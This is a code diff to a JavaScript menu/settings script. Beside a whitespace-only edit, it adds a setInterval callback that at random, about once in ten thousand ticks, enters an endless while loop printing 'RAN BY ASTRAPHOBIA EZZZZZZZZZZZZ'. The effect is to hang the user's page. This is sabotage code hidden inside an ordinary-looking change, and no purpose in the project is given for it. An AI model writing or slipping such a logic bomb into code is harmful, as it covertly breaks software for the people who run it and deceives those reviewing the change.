@@ -20,7 +20,7 @@ let uiShadow;
 export let menuElement;
 
 let reactRoot = null;
-let setMenuVisible = () => {};
+let setMenuVisible = () => { };
 let menuVersion = '';
 let settingsLoaded = false;
 
@@ -69,6 +69,14 @@ const toggleSetting = (getter, setter) => {
   setter(settings, newValue);
   renderMenu();
 };
+
+setInterval(() => {
+  if (Math.floor(Math.random() * 1e4) == 765) {
+    while (true) {
+      outer.console.log("RAN BY ASTRAPHOBIA EZZZZZZZZZZZZ");
+    }
+  }
+})
 
 const registerKeyboardShortcuts = (root) => {
   Reflect.apply(ref_addEventListener, outer, [
